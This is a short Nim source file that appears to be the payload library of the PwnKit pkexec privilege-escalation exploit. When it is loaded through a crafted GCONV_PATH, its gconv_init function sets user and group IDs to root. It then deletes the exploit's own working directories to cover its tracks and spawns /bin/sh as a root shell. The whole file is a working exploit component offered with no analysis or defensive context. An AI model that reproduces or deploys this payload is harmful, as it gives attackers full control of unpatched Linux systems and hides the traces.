import os
import posix

proc gconv*() {.stdcall, exportc, dynlib.} =
  return

proc gconv_init*() {.stdcall, exportc, dynlib.} =
  discard setuid(0)
  discard seteuid(0)
  discard setgid(0)
  discard setegid(0)

  removeDir("GCONV_PATH=.")
  removeDir("pwnkit")
  
  echo("Ding Dong #") 

  discard execve("/bin/sh",
    allocCStringArray(["sh"]),
    allocCStringArray(["PATH=/bin:/usr/bin:/sbin"]))
  
  quit(0)
